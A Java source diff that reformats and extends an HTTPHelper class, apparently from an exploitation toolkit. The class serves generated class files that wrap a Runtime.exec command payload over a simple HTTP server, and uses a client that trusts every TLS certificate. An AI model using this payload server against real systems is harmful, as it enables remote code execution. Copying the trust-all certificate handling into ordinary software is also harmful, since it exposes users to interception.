@@ -10,6 +10,10 @@ import javax.net.ssl.*;
 import java.io.IOException;
 import java.io.OutputStream;
 import java.net.InetSocketAddress;
+import java.net.Proxy;
+import java.security.KeyManagementException;
+import java.security.NoSuchAlgorithmException;
+import java.security.SecureRandom;
 import java.security.cert.CertificateException;
 import java.security.cert.X509Certificate;
 import java.util.List;
@@ -27,7 +31,7 @@ public class HTTPHelper {
 
     public static HttpServer makeSimpleHTTPServer(int port, Map<String, HttpHandler> paths) throws IOException {
         HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
-        for(Map.Entry<String, HttpHandler> path: paths.entrySet()){
+        for (Map.Entry<String, HttpHandler> path : paths.entrySet()) {
             server.createContext(path.getKey(), path.getValue());
         }
         server.setExecutor(null);
@@ -36,14 +40,14 @@ public class HTTPHelper {
 
     public static HttpHandler makeHTTPHandler(String filename, String body) throws Exception {
         HttpHandler handler = null;
-        if(body.startsWith("code:")){
+        if (body.startsWith("code:")) {
             body = body.substring(5);
-        }else{
+        } else {
             body = PayloadHelper.makeRuntimeExecPayload(body);
         }
 
         byte[] obj = ClassFiles.makeClassWithDefaultConstructor(
-                filename.replace(".class",""), body);
+                filename.replace(".class", ""), body);
 
 //        if(filename.endsWith(".class")){
 //            handler = new PayloadHandler(obj);
@@ -65,8 +69,8 @@ public class HTTPHelper {
 
         @Override
         public void handle(HttpExchange exchange) throws IOException {
-            Logger.normal("    Have request from "+exchange.getRemoteAddress());
-            Logger.normal("    Get request <"+exchange.getRequestMethod()+"> "+exchange.getRequestURI());
+            Logger.normal("    Have request from " + exchange.getRemoteAddress());
+            Logger.normal("    Get request <" + exchange.getRequestMethod() + "> " + exchange.getRequestURI());
             exchange.sendResponseHeaders(200, obj.length);
             OutputStream os = exchange.getResponseBody();
             os.write(obj);
@@ -75,20 +79,17 @@ public class HTTPHelper {
         }
     }
 
-    public static Response post(String url, RequestBody body, Headers headers, boolean vv){
-        Request request = new Request.Builder()
-                    .url(url)
-                    .headers(headers)
-                    .post(body)
-                    .build();
 
-//        Proxy proxy = new Proxy(Proxy.Type.HTTP,
-//                new InetSocketAddress("127.0.0.1", 7890));
-//
-//        client = new OkHttpClient.Builder()
-//                .proxy(proxy)
-//                .build();
-        try(Response response = client.newCall(request).execute()){
+    public static Response post(String url, RequestBody body, Headers headers, boolean vv) {
+        if (headers == null) {
+            headers = new Headers.Builder().build();
+        }
+        Request request = new Request.Builder()
+                .url(url)
+                .headers(headers)
+                .post(body)
+                .build();
+        try (Response response = client.newCall(request).execute()) {
             log(response, vv);
             return response;
         } catch (IOException e) {
@@ -97,15 +98,15 @@ public class HTTPHelper {
         }
     }
 
-    public static Response get(String url, Headers headers, boolean vv){
-        if(headers == null){
-            headers =  new Headers.Builder().build();
+    public static Response get(String url, Headers headers, boolean vv) {
+        if (headers == null) {
+            headers = new Headers.Builder().build();
         }
         Request request = new Request.Builder()
                 .url(url)
                 .headers(headers)
                 .build();
-        try(Response response = client.newCall(request).execute()){
+        try (Response response = client.newCall(request).execute()) {
             log(response, vv);
             return response;
         } catch (IOException e) {
@@ -113,14 +114,38 @@ public class HTTPHelper {
         }
     }
 
+    /**
+     * Convert response to string
+     *
+     * @param response
+     * @return
+     */
+    public static String parseResponse(Response response) {
+        String body = "";
+        try {
+            body = response.body().string();
+        } catch (IOException e) {
+
+        } catch (NullPointerException e) {
+
+        } catch (IllegalStateException e) {
+
+        }
+        String res = String.format("%d\n%s\nBody:\n%s\n",
+                response.code(),
+                response.headers(),
+                body);
+        return res;
+    }
+
     public static void log(Response response, boolean vv) throws IOException {
-        Logger.normal("Status Code: "+response.code());
+        Logger.normal("Status Code: " + response.code());
         Logger.normal("Response Headers:");
         Map<String, List<String>> responseHeaders = response.headers().toMultimap();
-        for(Map.Entry entry:responseHeaders.entrySet()){
-            Logger.normal(entry.getKey()+":"+entry.getValue());
+        for (Map.Entry entry : responseHeaders.entrySet()) {
+            Logger.normal(entry.getKey() + ":" + entry.getValue());
         }
-        if(vv){
+        if (vv) {
             Logger.normal("Response Body:");
             Logger.normal(response.body().string());
         }
@@ -153,8 +178,14 @@ public class HTTPHelper {
             sslContext.init(null, trustAllCerts, new java.security.SecureRandom());
             // Create an ssl socket factory with our all-trusting manager
             final SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();
-            client =  new OkHttpClient.Builder()
+
+            //TODO proxy
+            Proxy proxy = new Proxy(Proxy.Type.HTTP,
+                    new InetSocketAddress("127.0.0.1", 8080));
+
+            client = new OkHttpClient.Builder()
                     .sslSocketFactory(sslSocketFactory, (X509TrustManager) trustAllCerts[0])
+                    .proxy(proxy)
                     .hostnameVerifier(new HostnameVerifier() {
                         @Override
                         public boolean verify(String hostname, SSLSession session) {
